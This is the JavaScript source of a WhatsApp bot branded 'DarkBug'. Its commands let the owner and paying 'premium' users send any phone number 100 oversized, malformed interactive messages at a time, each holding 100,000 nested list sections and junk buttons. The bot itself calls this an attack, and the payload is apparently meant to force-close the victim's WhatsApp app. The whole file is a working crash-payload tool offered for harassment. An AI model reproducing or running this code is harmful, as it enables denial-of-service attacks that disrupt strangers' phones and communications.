const {
  generateWAMessageFromContent,
  proto,
} = require("@whiskeysockets/baileys");
const { ownerNumber } = require("./config.js");
const prefix = [".", "!", "#", "/", "$"];
const fs = require("fs");
const premiumPath = "./database/premium.json";
const premium = JSON.parse(fs.readFileSync(premiumPath));

const isPremium = (number) => {
  let position = false;
  premium.forEach((data, i) => {
    if (data.id === number) {
      position = i;
    }
  });

  if (position !== false) {
    if (Date.now() >= premium[position].expired) {
      premium.splice(position, 1);
      fs.writeFileSync(premiumPath, JSON.stringify(premium, null, 2));
      return false;
    } else {
      return true;
    }
  } else {
    return false;
  }
};

const deletePremium = (number) => {
  let position = false;
  premium.forEach((data, i) => {
    if (data.id === number) {
      position = i;
    }
  });

  if (position !== false) {
    premium.splice(position, 1);
    fs.writeFileSync(premiumPath, JSON.stringify(premium, null, 2));
    return true;
  }
  return false;
};

async function GenexVictim(sock, msg) {
  try {
    if (!msg.message) return;

    const messageType = Object.keys(msg.message)[0];

    const body =
      messageType === "conversation"
        ? msg.message.conversation
        : messageType === "extendedTextMessage"
        ? msg.message.extendedTextMessage.text
        : "";

    const isCmd = prefix.some((p) => body.startsWith(p));
    if (!isCmd) return;

    const usedPrefix = prefix.find((p) => body.startsWith(p));
    const command = body
      .slice(usedPrefix.length)
      .trim()
      .split(/ +/)
      .shift()
      .toLowerCase();
    const args = body.slice(usedPrefix.length).trim().split(/ +/).slice(1);
    const q = args.join(" ");

    const sender = msg.key.fromMe
      ? sock.user.id
      : msg.key.participant || msg.key.remoteJid;
    const senderNumber = sender.split("@")[0].split(":")[0];
    const senderName = msg.pushName || "User";
    const isOwner = ownerNumber.includes(senderNumber);

    const isGroup = msg.key.remoteJid.endsWith('@g.us');
    const groupMetadata = isGroup ? await sock.groupMetadata(msg.key.remoteJid) : null;
    const groupName = isGroup ? groupMetadata.subject : '';

    const reply = (teks) => {
      sock.sendMessage(
        msg.key.remoteJid,
        {
          text: teks,
          contextInfo: {
            externalAdReply: {
              title: "ୁୁୁୁୁୁୁୁୁୁୁୁୁୁୁୁୁୁୁ​᭄𒐬 | 𝔇𝔞𝔯𝔨𝔅𝔲𝔤",
              body: "WhatsApp Bot",
              previewType: "PHOTO",
              thumbnail: fs.readFileSync("./database/DarkBug.jpg"),
              sourceUrl: "https://wa.me/+2347030626048",
            },
          },
        },
        { quoted: msg }
      );
    };

    async function InvisiPayload(targetNumber) {
      let sections = [];

      for (let i = 0; i < 100000; i++) {
        let largeText = "";

        let deepNested = {
          title: `Super Deep Nested Section ${i}`,
          highlight_label: `Extreme Highlight ${i}`,
          rows: [
            {
              title: largeText,
              id: `id${i}`,
              subrows: [
                {
                  title: "Nested row 1",
                  id: `nested_id1_${i}`,
                  subsubrows: [
                    {
                      title: "Deep Nested row 1",
                      id: `deep_nested_id1_${i}`,
                    },
                    {
                      title: "Deep Nested row 2",
                      id: `deep_nested_id2_${i}`,
                    },
                  ],
                },
                {
                  title: "Nested row 2",
                  id: `nested_id2_${i}`,
                },
              ],
            },
          ],
        };

        sections.push(deepNested);
      }

      let listMessage = {
        title: "Massive Menu Overflow",
        sections: sections,
      };

      let msg = generateWAMessageFromContent(
        targetNumber,
        {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2,
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                contextInfo: {
                  mentionedJid: [targetNumber],
                  isForwarded: true,
                  forwardingScore: 999,
                  businessMessageForwardInfo: {
                    businessOwnerJid: targetNumber,
                  },
                },
                body: proto.Message.InteractiveMessage.Body.create({
                  text: "𒐬 | 𝔇𝔞𝔯𝔨𝔅𝔲𝔤",
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  buttonParamsJson: "JSON.stringify(listMessage)",
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                  buttonParamsJson: "JSON.stringify(listMessage)",
                  subtitle: "Testing Immediate Force Close",
                  hasMediaAttachment: false, // No media to focus purely on data overload
                }),
                nativeFlowMessage:
                  proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
                      {
                        name: "single_select",
                        buttonParamsJson: "JSON.stringify(listMessage)",
                      },
                      {
                        name: "payment_method",
                        buttonParamsJson: "{}",
                      },
                      {
                        name: "call_permission_request",
                        buttonParamsJson: "{}",
                      },
                      {
                        name: "single_select",
                        buttonParamsJson: "JSON.stringify(listMessage)",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "JSON.stringify(listMessage)",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "JSON.stringify(listMessage)",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "JSON.stringify(listMessage)",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "{}",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "{}",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "{}",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "{}",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "{}",
                      },
                    ],
                  }),
              }),
            },
          },
        },
        { userJid: targetNumber }
      );

      await sock.relayMessage(targetNumber, msg.message, {
        participant: { jid: targetNumber },
        messageId: msg.key.id,
      });
    }

    const addPremium = (number, duration) => {
      const obj = {
        id: number,
        expired: Date.now() + duration,
      };
      premium.push(obj);
      fs.writeFileSync(premiumPath, JSON.stringify(premium, null, 2));
    };

    switch (command) {
      case "menu":
      case "help":
        const menuText = `
╔━━━━━━━『𝔇𝔞𝔯𝔨 𝔅𝔲𝔤 mini』━━━━━╗
║ɴᴀᴍᴇ: 𝔇𝔞𝔯𝔨 𝔅𝔲𝔤 🪲                   
║ᴏᴡɴᴇʀ: 2347030626048            
║ᴅᴇᴠᴇʟᴏᴘᴇʀ: C0D3BR34K3R  
║ᴠᴇʀsɪᴏɴ: 1.0.0
╚━━━━━━━━━━━━━━━━━━━━━━━━━╝


╔━━━━ 𒆜 𝐁𝐔𝐆 𝐌𝐄𝐍𝐔 𒆜━━━━━──━╗
║# foreclose < ɴᴜᴍʙᴇʀ >
║# DarkBug < ɴᴜᴍʙᴇʀ >
║# goodbye < ɴᴜᴍʙᴇʀ >
║# Hello < ɴᴜᴍʙᴇʀ >
║# ʀᴇsᴘᴏɴᴅɪɴɢ
╚━━━━━━━━━━━━━━━━━━━━━━━━━╝

╔━━━ 𒆜 𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔 𒆜━━━━━━╗
║# ᴀᴅᴅᴘʀᴇᴍ < @/ɴᴜᴍʙᴇʀ >
║# ᴅᴇʟᴘʀᴇᴍ < @/ɴᴜᴍʙᴇʀ >
╚━━━━━━━━━━━━━━━━━━━━━━━━━╝.`; 
        reply(menuText);
        break;

      case "forceclose":
      case "Darkbug":
      case "goodbye":
      case "Hello":
      case "responding":
        if (!isOwner && !isPremium(sender))
          return reply("⚠️ 𝐎𝐧𝐥𝐲 𝐩𝐫𝐞𝐦𝐢𝐮𝐦 & 𝐨𝐰𝐧𝐞𝐫 𝐮𝐬𝐞𝐫!!");
        if (!args[0])
          return reply(`⚠️ 𝐈𝐧𝐜𝐨𝐫𝐫𝐞𝐜𝐭 𝐮𝐬𝐞

◇ 𝐅𝐨𝐫𝐦𝐚𝐭 .${command} < 𝐍𝐮𝐦𝐛𝐞𝐫 >
◇ 𝐅𝐨𝐫𝐦𝐚𝐭 .${command} < 234𝐱𝐱𝐱 >

𝐍𝐨𝐭𝐞
⪩ 𝐃𝐨 𝐧𝐨𝐭 𝐮𝐬𝐞 𝐮𝐬𝐢𝐧𝐠 𝐭𝐡𝐞 @/-/+ 𝐬𝐢𝐠𝐧 𝐝𝐞𝐥𝐞𝐭𝐞 𝐭𝐡𝐚𝐭 𝐩𝐚𝐫𝐭
⪩ 𝐂𝐚𝐧 𝐮𝐬𝐞 𝐚𝐧𝐲 𝐜𝐨𝐮𝐧𝐭𝐫𝐲 𝐜𝐨𝐝𝐞`);

        let number = args[0];
        number = number.replace(/[^0-9]/g, "");

        if (number.length < 7) {
          return reply(`⚠️ 𝐍𝐮𝐦𝐛𝐞𝐫𝐬 𝐚𝐫𝐞 𝐭𝐨𝐨 𝐬𝐡𝐨𝐫𝐭
            
◇ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐧𝐮𝐦𝐛𝐞𝐫
◇ 𝐄𝐱𝐚𝐦𝐩𝐥𝐞 : 2347088910126`);
        }

        const targetNumber = `${number}@s.whatsapp.net`;

        try {
        reply(`𝐈𝐧 𝐩𝐫𝐨𝐜𝐜𝐞𝐬𝐬 𝐬𝐞𝐧𝐝𝐞𝐫 𝐛𝐮𝐠 𝐭𝐨 ${targetNumber}`);
          for (let i = 0; i < 100; i++) {
            await InvisiPayload(targetNumber);
          }
          reply(`𝐒𝐮𝐜𝐜𝐞𝐬𝐬 𝐚𝐭𝐭𝐚𝐜𝐤 𝐧𝐮𝐦𝐛𝐞𝐫 ${targetNumber} 𝐰𝐢𝐭𝐡 𝐜𝐦𝐝 ${command}!!`);
          console.log(`Success Attack ${targetNumber} with 𝔇𝔞𝔯𝔨𝔅𝔲𝔤!`);
        } catch (err) {
          console.error("𝔇𝔞𝔯𝔨𝔅𝔲𝔤 Error:", err);
          reply("⚠️ 𝐄𝐫𝐫𝐨𝐫 𝐭𝐨 𝐬𝐞𝐧𝐝𝐞𝐫!!");
        }
        break;

      case "addprem":
        if (!isOwner) return reply("⚠️ 𝐎𝐧𝐥𝐲 𝐨𝐰𝐧𝐞𝐫 𝐮𝐬𝐞𝐫!!");
        if (args.length < 2)
          return reply(`⚠️ 𝐈𝐧𝐜𝐨𝐫𝐫𝐞𝐜𝐭 𝐮𝐬𝐞
        
◇ 𝐅𝐨𝐫𝐦𝐚𝐭: .𝐚𝐝𝐝𝐩𝐫𝐞𝐦 < 𝐧𝐮𝐦𝐛𝐞𝐫 > < 𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧 >
◇ 𝐅𝐨𝐫𝐦𝐚𝐭: .𝐚𝐝𝐝𝐩𝐫𝐞𝐦 234𝐱𝐱𝐱 𝟑𝟎𝐝
◇ 𝐅𝐨𝐫𝐦𝐚𝐭: .𝐚𝐝𝐝𝐩𝐫𝐞𝐦 @𝐭𝐚𝐠 𝟑𝟎𝐝

𝐍𝐨𝐭𝐞: 
- 𝐂𝐚𝐧 𝐮𝐬𝐞 𝐚𝐧𝐲 𝐜𝐨𝐮𝐧𝐭𝐫𝐲 𝐜𝐨𝐝𝐞
- 𝐖𝐚𝐤𝐭𝐮 𝐛𝐢𝐬𝐚 𝐝𝐚𝐥𝐚𝐦 𝐟𝐨𝐫𝐦𝐚𝐭:
  30s = 30 𝐝𝐞𝐭𝐢𝐤
  30m = 30 𝐦𝐞𝐧𝐢𝐭
  30h = 30 𝐣𝐚𝐦
  30d = 30 𝐡𝐚𝐫𝐢`);

        let premnumber = args[0];
        premnumber = premnumber.replace(/[^0-9]/g, "");

        let timeFormat = args[1].toLowerCase();
        let multiplier;

        if (timeFormat.endsWith("s")) multiplier = 1000;
        else if (timeFormat.endsWith("m")) multiplier = 60000;
        else if (timeFormat.endsWith("h")) multiplier = 3600000;
        else if (timeFormat.endsWith("d")) multiplier = 86400000;
        else return reply("⚠️ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐭𝐢𝐦𝐞 𝐟𝐨𝐫𝐦𝐚𝐭!!");

        let duration = parseInt(timeFormat.slice(0, -1)) * multiplier;
        if (isNaN(duration)) return reply("⚠️ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐭𝐢𝐦𝐞!!");

        try {
          addPremium(`${premnumber}@s.whatsapp.net`, duration);
          reply(`✅ 𝐒𝐮𝐜𝐜𝐞𝐬 𝐚𝐝𝐝 𝐭𝐨 𝐮𝐬𝐞𝐫 𝐩𝐫𝐞𝐦𝐢𝐮𝐦!!
          
◇ 𝐍𝐮𝐦𝐛𝐞𝐫: ${premnumber}
◇ 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧: ${timeFormat}
◇ 𝐄𝐱𝐩𝐢𝐫𝐞𝐝: ${new Date(Date.now() + duration).toLocaleString()}`);
        } catch (err) {
          console.error(err);
          reply("⚠️ 𝐅𝐚𝐢𝐥𝐞𝐝 𝐭𝐨 𝐚𝐝𝐝 𝐩𝐫𝐞𝐦𝐢𝐮𝐦 𝐮𝐬𝐞𝐫𝐬!!");
        }
        break;

      case "delprem":
        if (!isOwner) return reply("⚠️ 𝐎𝐧𝐥𝐲 𝐨𝐰𝐧𝐞𝐫 𝐮𝐬𝐞𝐫!!");
        if (!args[0])
          return reply(`⚠️ 𝐈𝐧𝐜𝐨𝐫𝐫𝐞𝐜𝐭 𝐮𝐬𝐞
        
◇ 𝐅𝐨𝐫𝐦𝐚𝐭: .𝐝𝐞𝐥𝐩𝐫𝐞𝐦 < 𝐧𝐮𝐦𝐛𝐞𝐫 >
◇ 𝐅𝐨𝐫𝐦𝐚𝐭: .𝐝𝐞𝐥𝐩𝐫𝐞𝐦 < 234𝐱𝐱𝐱 >

𝐍𝐨𝐭𝐞: 
⪩ 𝐔𝐬𝐞 𝐰𝐢𝐭𝐡𝐨𝐮𝐭 𝐜𝐨𝐝𝐞 @/-/+ 𝐮𝐧𝐝𝐞𝐫𝐬𝐭𝐚𝐧𝐝
⪩ 𝐂𝐚𝐧 𝐮𝐬𝐞 𝐚𝐧𝐲 𝐜𝐨𝐮𝐧𝐭𝐫𝐲 𝐜𝐨𝐝𝐞`);

        let delpremNumber = args[0];
        delpremNumber = delpremNumber.replace(/[^0-9]/g, "");

        try {
          const targetJid = `${delpremNumber}@s.whatsapp.net`;
          const success = deletePremium(targetJid);

          if (success) {
            reply(`✅ 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐫𝐞𝐦𝐨𝐯𝐞𝐝 𝐩𝐫𝐞𝐦𝐢𝐮𝐦 𝐮𝐬𝐞𝐫𝐬!! 
            
◇ 𝐍𝐮𝐦𝐛𝐞𝐫: ${delpremNumber}`);
          } else {
            reply(`⚠️ 𝐅𝐚𝐢𝐥𝐞𝐝 𝐫𝐞𝐦𝐨𝐯𝐞 𝐩𝐫𝐞𝐦𝐢𝐮𝐦 𝐮𝐬𝐞𝐫!! 
            
◇ 𝐍𝐮𝐦𝐛𝐞𝐫 ${delpremNumber} 𝐍𝐨𝐭 𝐨𝐧 𝐭𝐡𝐞 𝐩𝐫𝐞𝐦𝐢𝐮𝐦 𝐮𝐬𝐞𝐫 𝐥𝐢𝐬𝐭!!`);
          }
        } catch (err) {
          console.error(err);
          reply("⚠️ 𝐀𝐧 𝐞𝐫𝐫𝐨𝐫 𝐨𝐜𝐜𝐮𝐫𝐫𝐞𝐝 𝐰𝐡𝐢𝐥𝐞 𝐝𝐞𝐥𝐞𝐭𝐢𝐧𝐠 𝐚 𝐩𝐫𝐞𝐦𝐢𝐮𝐦 𝐮𝐬𝐞𝐫!!");
        }
        break;

      default:
        break;
    }
  } catch (error) {
    console.error("Error:", error);
    reply("An error occurred in the system");
  }
}

module.exports = { GenexVictim };
